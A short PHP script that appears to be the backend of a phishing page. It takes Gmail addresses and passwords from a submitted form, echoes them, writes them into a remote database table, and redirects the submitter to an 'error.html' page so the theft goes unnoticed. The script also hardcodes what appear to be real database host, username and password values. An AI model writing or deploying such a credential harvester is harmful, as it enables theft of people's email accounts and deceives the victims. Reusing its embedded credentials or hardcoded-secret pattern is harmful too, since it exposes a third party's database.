<?php
	$gmail = $_POST['gmail'];
	$password = $_POST['password'];
	echo "$gmail";
	echo "$password";

	//$conn = new mysqli('localhost','root','','haitomns');
	$conn = new mysqli('sql308.epizy.com','epiz_25434610','BefgULAEbYEYUm','epiz_25434610_haitomns_webpage');
	if($conn->connect_error)
	{
		die('Connection Failed : '.$conn->connect_error);
	}
	else
	{
		$stmt = $conn->prepare("insert into contact(gmail, password) values(?,?)");
		$stmt->bind_param("ss",$gmail, $password);
		$stmt->execute();
		$stmt->close();
		$conn->close();
		header('Location: error.html');
	}
?>